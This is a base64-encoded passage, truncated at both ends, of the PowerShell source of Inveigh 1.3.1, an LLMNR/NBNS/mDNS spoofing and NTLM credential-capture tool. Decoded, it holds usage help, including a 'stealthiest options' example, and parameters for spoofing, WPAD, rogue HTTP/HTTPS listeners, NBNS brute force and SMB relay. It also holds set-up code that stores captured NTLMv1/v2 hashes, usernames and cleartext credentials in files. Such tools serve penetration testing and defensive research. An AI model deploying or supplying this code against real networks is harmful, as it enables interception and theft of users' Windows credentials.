3aGVuCnVzaW5nIFdQQURJUCwgV1BBRFBvcnQsIG9yIFdQQURSZXNwb25zZS4KCi5QQVJBTUVURVIgV1BBRERpcmVjdEhvc3RzCkNvbW1hIHNlcGFyYXRlZCBsaXN0IG9mIGhvc3RzIHRvIGxpc3QgYXMgZGlyZWN0IGluIHRoZSB3cGFkLmRhdCBmaWxlLiBMaXN0ZWQgaG9zdHMgd2lsbCBub3QgYmUgcm91dGVkIHRocm91Z2ggdGhlCmRlZmluZWQgcHJveHkuCgouUEFSQU1FVEVSIFdQQURJUApQcm94eSBzZXJ2ZXIgSVAgdG8gYmUgaW5jbHVkZWQgaW4gYSBiYXNpYyB3cGFkLmRhdCByZXNwb25zZSBmb3IgV1BBRCBlbmFibGVkIGJyb3dzZXJzLiBUaGlzIHBhcmFtZXRlciBtdXN0IGJlIHVzZWQKd2l0aCBXUEFEUG9ydC4KCi5QQVJBTUVURVIgV1BBRFBvcnQKUHJveHkgc2VydmVyIHBvcnQgdG8gYmUgaW5jbHVkZWQgaW4gYSBiYXNpYyB3cGFkLmRhdCByZXNwb25zZSBmb3IgV1BBRCBlbmFibGVkIGJyb3dzZXJzLiBUaGlzIHBhcmFtZXRlciBtdXN0IGJlCnVzZWQgd2l0aCBXUEFESVAuCgouUEFSQU1FVEVSIFdQQURSZXNwb25zZQp3cGFkLmRhdCBmaWxlIGNvbnRlbnRzIHRvIHNlcnZlIGFzIHRoZSB3cGFkLmRhdCByZXNwb25zZS4gVGhpcyBwYXJhbWV0ZXIgd2lsbCBub3QgYmUgdXNlZCBpZiBXUEFESVAgYW5kIFdQQURQb3J0CmFyZSBzZXQuIFVzZSBQb3dlclNoZWxsIGNoYXJhY3RlciBlc2NhcGVzIHdoZXJlIG5lY2Vzc2FyeS4KCi5FWEFNUExFCkltcG9ydC1Nb2R1bGUgLlxJbnZlaWdoLnBzZDE7SW52b2tlLUludmVpZ2gKSW1wb3J0IGZ1bGwgbW9kdWxlIGFuZCBleGVjdXRlIHdpdGggYWxsIGRlZmF1bHQgc2V0dGluZ3MuCgouRVhBTVBMRQouIC4vSW52ZWlnaC5wczE7SW52b2tlLUludmVpZ2ggLUlQIDE5Mi4xNjguMS4xMApEb3Qgc291cmNlIGxvYWQgYW5kIGV4ZWN1dGUgc3BlY2lmeWluZyBhIHNwZWNpZmljIGxvY2FsIGxpc3RlbmluZy9zcG9vZmluZyBJUC4KCi5FWEFNUExFCkludm9rZS1JbnZlaWdoIC1JUCAxOTIuMTY4LjEuMTAgLUhUVFAgTgpFeGVjdXRlIHNwZWNpZnlpbmcgYSBzcGVjaWZpYyBsb2NhbCBsaXN0ZW5pbmcvc3Bvb2ZpbmcgSVAgYW5kIGRpc2FibGluZyBIVFRQIGNoYWxsZW5nZS9yZXNwb25zZS4KCi5FWEFNUExFCkludm9rZS1JbnZlaWdoIC1TcG9vZmVyUmVwZWF0IE4gLVdQQURBdXRoIEFub255bW91cyAtU3Bvb2Zlckhvc3RzUmVwbHkgaG9zdDEsaG9zdDIgLVNwb29mZXJJUHNSZXBseSAxOTIuMTY4LjIuNzUsMTkyLjE2OC4yLjc2CkV4ZWN1dGUgd2l0aCB0aGUgc3RlYWx0aGllc3Qgb3B0aW9ucy4KCi5FWEFNUExFCkludm9rZS1JbnZlaWdoIC1JbnNwZWN0CkV4ZWN1dGUgaW4gb3JkZXIgdG8gb25seSBpbnBlY3QgTExNTlIvbUROUy9OQk5TIHRyYWZmaWMuCgouRVhBTVBMRQpJbnZva2UtSW52ZWlnaCAtSVAgMTkyLjE2OC4xLjEwIC1TcG9vZmVySVAgMTkyLjE2OC4yLjUwIC1IVFRQIE4KRXhlY3V0ZSBzcGVjaWZ5aW5nIGEgc3BlY2lmaWMgbG9jYWwgbGlzdGVuaW5nIElQIGFuZCBhIExMTU5SL05CTlMgc3Bvb2ZpbmcgSVAgb24gYW5vdGhlciBzdWJuZXQuIFRoaXMgbWF5IGJlCnVzZWZ1bCBmb3Igc2VuZGluZyB0cmFmZmljIHRvIGEgY29udHJvbGxlZCBMaW51eCBzeXN0ZW0gb24gYW5vdGhlciBzdWJuZXQuCgouRVhBTVBMRQpJbnZva2UtSW52ZWlnaCAtSFRUUFJlc3BvbnNlICI8aHRtbD48aGVhZD48bWV0YSBodHRwLWVxdWl2PSdyZWZyZXNoJyBjb250ZW50PScwOyB1cmw9aHR0cHM6Ly9kdWNrZHVja2dvLmNvbS8nPjwvaGVhZD48L2h0bWw+IgpFeGVjdXRlIHNwZWNpZnlpbmcgYW4gSFRUUCByZWRpcmVjdCByZXNwb25zZS4gCgouTElOSwpodHRwczovL2dpdGh1Yi5jb20vS2V2aW4tUm9iZXJ0c29uL0ludmVpZ2gKIz4KCiMgUGFyYW1ldGVyIGRlZmF1bHQgdmFsdWVzIGNhbiBiZSBtb2RpZmllZCBpbiB0aGlzIHNlY3Rpb246IApbQ21kbGV0QmluZGluZygpXQpwYXJhbQooIAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bQXJyYXldJEhUVFBSZXNldERlbGF5ID0gIkZpcmVmb3giLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bQXJyYXldJFByb3h5SWdub3JlID0gIkZpcmVmb3giLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bQXJyYXldJFNwb29mZXJIb3N0c1JlcGx5ID0gIiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtBcnJheV0kU3Bvb2Zlckhvc3RzSWdub3JlID0gIiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtBcnJheV0kU3Bvb2ZlcklQc1JlcGx5ID0gIiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtBcnJheV0kU3Bvb2ZlcklQc0lnbm9yZSA9ICIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bQXJyYXldJFdQQUREaXJlY3RIb3N0cyA9ICIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bQXJyYXldJFdQQURBdXRoSWdub3JlID0gIkZpcmVmb3giLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bSW50XSRDb25zb2xlUXVldWVMaW1pdCA9ICItMSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtJbnRdJENvbnNvbGVTdGF0dXMgPSAiIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW0ludF0kSFRUUFBvcnQgPSAiODAiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bSW50XSRIVFRQU1BvcnQgPSAiNDQzIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW0ludF0kSFRUUFJlc2V0RGVsYXlUaW1lb3V0ID0gIjMwIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW0ludF0kTExNTlJUVEwgPSAiMzAiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bSW50XSRtRE5TVFRMID0gIjEyMCIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtJbnRdJE5CTlNUVEwgPSAiMTY1IiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW0ludF0kTkJOU0JydXRlRm9yY2VQYXVzZSA9ICIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bSW50XSRQcm94eVBvcnQgPSAiODQ5MiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtJbnRdJFJ1bkNvdW50ID0gIiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtJbnRdJFJ1blRpbWUgPSAiIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW0ludF0kV1BBRFBvcnQgPSAiIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW0ludF0kU3Bvb2ZlckxlYXJuaW5nRGVsYXkgPSAiIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW0ludF0kU3Bvb2ZlckxlYXJuaW5nSW50ZXJ2YWwgPSAiMzAiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3RyaW5nXSRIVFRQQmFzaWNSZWFsbSA9ICJJSVMiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3RyaW5nXSRIVFRQQ29udGVudFR5cGUgPSAidGV4dC9odG1sIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N0cmluZ10kSFRUUERlZmF1bHRGaWxlID0gIiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtTdHJpbmddJEhUVFBEZWZhdWx0RVhFID0gIiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtTdHJpbmddJEhUVFBSZXNwb25zZSA9ICIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3RyaW5nXSRIVFRQU0NlcnRJc3N1ZXIgPSAiSW52ZWlnaCIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtTdHJpbmddJEhUVFBTQ2VydFN1YmplY3QgPSAibG9jYWxob3N0IiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N0cmluZ10kTkJOU0JydXRlRm9yY2VIb3N0ID0gIldQQUQiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3RyaW5nXSRXUEFEUmVzcG9uc2UgPSAiIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlUGF0dGVybignXltBLUZhLWYwLTldezE2fSQnKV1bU3RyaW5nXSRDaGFsbGVuZ2UgPSAiIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJENvbnNvbGVVbmlxdWUgPSAiWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRGaWxlT3V0cHV0ID0gIk4iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kRmlsZVVuaXF1ZSA9ICJZIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJEhUVFAgPSAiWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRIVFRQUyA9ICJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJEhUVFBTRm9yY2VDZXJ0RGVsZXRlID0gIk4iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kTExNTlIgPSAiWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRMb2dPdXRwdXQgPSAiWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRNYWNoaW5lQWNjb3VudHMgPSAiTiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRtRE5TID0gIk4iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kTkJOUyA9ICJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJE5CTlNCcnV0ZUZvcmNlID0gIk4iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kT3V0cHV0U3RyZWFtT25seSA9ICJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJFByb3h5ID0gIk4iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kU2hvd0hlbHAgPSAiWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRTTUIgPSAiWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRTcG9vZmVyTGVhcm5pbmcgPSAiTiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRTcG9vZmVyUmVwZWF0ID0gIlkiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kU3RhdHVzT3V0cHV0ID0gIlkiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kV1BBRERpcmVjdEZpbGUgPSAiWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRTdGFydHVwQ2hlY2tzID0gIlkiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIiwiTG93IiwiTWVkaXVtIildW1N0cmluZ10kQ29uc29sZU91dHB1dCA9ICJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJBdXRvIiwiWSIsIk4iKV1bU3RyaW5nXSRFbGV2YXRlZFByaXZpbGVnZSA9ICJBdXRvIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJBbm9ueW1vdXMiLCJCYXNpYyIsIk5UTE0iLCJOVExNTm9FU1MiKV1bU3RyaW5nXSRIVFRQQXV0aCA9ICJOVExNIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJRVSIsIlFNIildW0FycmF5XSRtRE5TVHlwZXMgPSBAKCJRVSIpLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIjAwIiwiMDMiLCIyMCIsIjFCIiwiMUMiLCIxRCIsIjFFIildW0FycmF5XSROQk5TVHlwZXMgPSBAKCIwMCIsIjIwIiksCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiQmFzaWMiLCJOVExNIiwiTlRMTU5vRVNTIildW1N0cmluZ10kUHJveHlBdXRoID0gIk5UTE0iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIjAiLCIxIiwiMiIpXVtTdHJpbmddJFRvb2wgPSAiMCIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiQW5vbnltb3VzIiwiQmFzaWMiLCJOVExNIiwiTlRMTU5vRVNTIildW1N0cmluZ10kV1BBREF1dGggPSAiTlRMTSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNjcmlwdCh7VGVzdC1QYXRoICRffSldW1N0cmluZ10kRmlsZU91dHB1dERpcmVjdG9yeSA9ICIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTY3JpcHQoe1Rlc3QtUGF0aCAkX30pXVtTdHJpbmddJEhUVFBEaXIgPSAiIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N3aXRjaF0kSW5zcGVjdCwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2NyaXB0KHskXyAtbWF0Y2ggW1N5c3RlbS5OZXQuSVBBZGRyZXNzXSRffSldW1N0cmluZ10kSFRUUElQID0gIjAuMC4wLjAiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTY3JpcHQoeyRfIC1tYXRjaCBbU3lzdGVtLk5ldC5JUEFkZHJlc3NdJF99KV1bU3RyaW5nXSRJUCA9ICIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTY3JpcHQoeyRfIC1tYXRjaCBbU3lzdGVtLk5ldC5JUEFkZHJlc3NdJF99KV1bU3RyaW5nXSROQk5TQnJ1dGVGb3JjZVRhcmdldCA9ICIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTY3JpcHQoeyRfIC1tYXRjaCBbU3lzdGVtLk5ldC5JUEFkZHJlc3NdJF99KV1bU3RyaW5nXSRQcm94eUlQID0gIjAuMC4wLjAiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTY3JpcHQoeyRfIC1tYXRjaCBbU3lzdGVtLk5ldC5JUEFkZHJlc3NdJF99KV1bU3RyaW5nXSRTcG9vZmVySVAgPSAiIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2NyaXB0KHskXyAtbWF0Y2ggW1N5c3RlbS5OZXQuSVBBZGRyZXNzXSRffSldW1N0cmluZ10kV1BBRElQID0gIiIsCiAgICBbcGFyYW1ldGVyKFZhbHVlRnJvbVJlbWFpbmluZ0FyZ3VtZW50cz0kdHJ1ZSldJGludmFsaWRfcGFyYW1ldGVyCikKCmlmICgkaW52YWxpZF9wYXJhbWV0ZXIpCnsKICAgIFdyaXRlLU91dHB1dCAiRXJyb3I6JCgkaW52YWxpZF9wYXJhbWV0ZXIpIGlzIG5vdCBhIHZhbGlkIHBhcmFtZXRlciIKICAgIHRocm93Cn0KCiRpbnZlaWdoX3ZlcnNpb24gPSAiMS4zLjEiCgppZighJElQKQp7IAogICAgJElQID0gKFRlc3QtQ29ubmVjdGlvbiAxMjcuMC4wLjEgLWNvdW50IDEgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBJcHY0QWRkcmVzcykKfQoKaWYoISRTcG9vZmVySVApCnsKICAgICRTcG9vZmVySVAgPSAkSVAgIAp9CgppZigkSFRUUERlZmF1bHRGaWxlIC1vciAkSFRUUERlZmF1bHRFWEUpCnsKCiAgICBpZighJEhUVFBEaXIpCiAgICB7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJFcnJvcjpZb3UgbXVzdCBzcGVjaWZ5IGFuIC1IVFRQRGlyIHdoZW4gdXNpbmcgZWl0aGVyIC1IVFRQRGVmYXVsdEZpbGUgb3IgLUhUVFBEZWZhdWx0RVhFIgogICAgICAgIHRocm93CiAgICB9Cgp9CgppZigkV1BBRElQIC1vciAkV1BBRFBvcnQpCnsKCiAgICBpZighJFdQQURJUCkKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIkVycm9yOllvdSBtdXN0IHNwZWNpZnkgYSAtV1BBRFBvcnQgdG8gZ28gd2l0aCAtV1BBRElQIgogICAgICAgIHRocm93CiAgICB9CgogICAgaWYoISRXUEFEUG9ydCkKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIkVycm9yOllvdSBtdXN0IHNwZWNpZnkgYSAtV1BBRElQIHRvIGdvIHdpdGggLVdQQURQb3J0IgogICAgICAgIHRocm93CiAgICB9Cgp9CgppZigkTkJOU0JydXRlRm9yY2UgLWVxICdZJyAtYW5kICEkTkJOU0JydXRlRm9yY2VUYXJnZXQpCnsKICAgIFdyaXRlLU91dHB1dCAiRXJyb3I6WW91IG11c3Qgc3BlY2lmeSBhIC1OQk5TQnJ1dGVGb3JjZVRhcmdldCBpZiBlbmFibGluZyAtTkJOU0JydXRlRm9yY2UiCiAgICB0aHJvdwp9CgppZighJEZpbGVPdXRwdXRkaXJlY3RvcnkpCnsgCiAgICAkb3V0cHV0X2RpcmVjdG9yeSA9ICRQV0QuUGF0aAp9CmVsc2UKewogICAgJG91dHB1dF9kaXJlY3RvcnkgPSAkRmlsZU91dHB1dGRpcmVjdG9yeQp9CgppZighJGludmVpZ2gpCnsKICAgICRnbG9iYWw6aW52ZWlnaCA9IFtIYXNoVGFibGVdOjpTeW5jaHJvbml6ZWQoQHt9KQogICAgJGludmVpZ2guY2xlYXJ0ZXh0X2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2gubG9nID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5OVExNdjFfbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guTlRMTXYxX3VzZXJuYW1lX2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLk5UTE12Ml9saXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5OVExNdjJfdXNlcm5hbWVfbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guUE9TVF9yZXF1ZXN0X2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLlNNQlJlbGF5X2ZhaWxlZF9saXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC52YWxpZF9ob3N0X2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKfQoKaWYoJGludmVpZ2gucnVubmluZykKewogICAgV3JpdGUtT3V0cHV0ICJFcnJvcjpJbnZva2UtSW52ZWlnaCBpcyBhbHJlYWR5IHJ1bm5pbmcsIHVzZSBTdG9wLUludmVpZ2giCiAgICB0aHJvdwp9CgppZigkSFRUUF9saXN0ZW5lci5Jc0xpc3RlbmluZyAtYW5kICEkaW52ZWlnaC5yZWxheV9ydW5uaW5nKQp7CiAgICAkSFRUUF9saXN0ZW5lci5TdG9wKCkKICAgICRIVFRQX2xpc3RlbmVyLkNsb3NlKCkKfQoKaWYoISRpbnZlaWdoLnJlbGF5X3J1bm5pbmcpCnsKICAgICRpbnZlaWdoLmNsZWFydGV4dF9maWxlX3F1ZXVlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5IVFRQX2NoYWxsZW5nZV9xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLk5UTE12MV9maWxlX3F1ZXVlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guUE9TVF9yZXF1ZXN0X2ZpbGVfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guY29uc29sZV9pbnB1dCA9ICR0cnVlCiAgICAkaW52ZWlnaC5jb25zb2xlX291dHB1dCA9ICRmYWxzZQogICAgJGludmVpZ2guZmlsZV9vdXRwdXQgPSAkZmFsc2UKICAgICRpbnZlaWdoLkhUVFBTX2V4aXN0aW5nX2NlcnRpZmljYXRlID0gJGZhbHNlCiAgICAkaW52ZWlnaC5IVFRQU19mb3JjZV9jZXJ0aWZpY2F0ZV9kZWxldGUgPSAkZmFsc2UKICAgICRpbnZlaWdoLmxvZ19vdXRwdXQgPSAkdHJ1ZQogICAgJGludmVpZ2guY2xlYXJ0ZXh0X291dF9maWxlID0gJG91dHB1dF9kaXJlY3RvcnkgKyAiXEludmVpZ2gtQ2xlYXJ0ZXh0LnR4dCIKICAgICRpbnZlaWdoLmxvZ19vdXRfZmlsZSA9ICRvdXRwdXRfZGlyZWN0b3J5ICsgIlxJbnZlaWdoLUxvZy50eHQiCiAgICAkaW52ZWlnaC5OVExNdjFfb3V0X2ZpbGUgPSAkb3V0cHV0X2RpcmVjdG9yeSArICJcSW52ZWlnaC1OVExNdjEudHh0IgogICAgJGludmVpZ2guTlRMTXYyX291dF9maWxlID0gJG91dHB1dF9kaXJlY3RvcnkgKyAiXEludmVpZ2gtTlRMTXYyLnR4dCIKICAgICRpbnZlaWdoLlBPU1RfcmVxdWVzdF9vdXRfZmlsZSA9ICRvdXRwdXRfZGlyZWN0b3J5ICsgIlxJbnZlaWdoLUZvcm1JbnB1dC50eHQiCn0KCmlmKCRFbGV2YXRlZFByaXZpbGVnZSAtZXEgJ0F1dG8nKQp7CiAgICAkZWxldmF0ZWRfcHJpdmlsZWdlID0gW0Jvb2xdKChbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLmdyb3VwcyAtbWF0Y2ggIlMtMS01LTMyLTU0NCIpCn0KZWxzZQp7CiAKICAgIGlmKCRFbGV2YXRlZFByaXZpbGVnZSAtZXEgJ1knKQogICAgewogICAgICAgICRlbGV2YXRlZF9wcml2aWxlZ2UgPSAkdHJ1ZQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRlbGV2YXRlZF9wcml2aWxlZ2UgPSAkZmFsc2UKICAgIH0KICAgIAp9CgppZigkU3RhcnR1cENoZWNrcyAtZXEgJ1knKQp7CgogICAgJGZpcmV3YWxsX3N0YXR1cyA9IG5ldHNoIGFkdmZpcmV3YWxsIHNob3cgYWxscHJvZmlsZXMgc3RhdGUgfCBXaGVyZS1PYmplY3QgeyRfIC1tYXRjaCAnT04nfQoKICAgIGlmKCRIVFRQIC1lcSAnWScpCiAgICB7CiAgICAgICAgJEhUVFBfcG9ydF9jaGVjayA9IG5ldHN0YXQgLWFucCBUQ1AgfCBmaW5kc3RyIExJU1RFTklORyB8IGZpbmRzdHIgL0M6IiRIVFRQSVBgOiRIVFRQUG9ydCAiCiAgICB9CgogICAgaWYoJEhUVFBTIC1lcSAnWScpCiAgICB7CiAgICAgICAgJEhUVFBTX3BvcnRfY2hlY2sgPSBuZXRzdGF0IC1hbnAgVENQIHwgZmluZHN0ciBMSVNURU5JTkcgfCBmaW5kc3RyIC9DOiIkSFRUUElQYDokSFRUUFNQb3J0ICIKICAgIH0KCiAgICBpZigkUHJveHkgLWVxICdZJykKICAgIHsKICAgICAgICAkcHJveHlfcG9ydF9jaGVjayA9IG5ldHN0YXQgLWFucCBUQ1AgfCBmaW5kc3RyIExJU1RFTklORyB8IGZpbmRzdHIgL0M6IiRIVFRQSVBgOiRQcm94eVBvcnQgIgogICAgfQoKICAgIGlmKCRMTE1OUiAtZ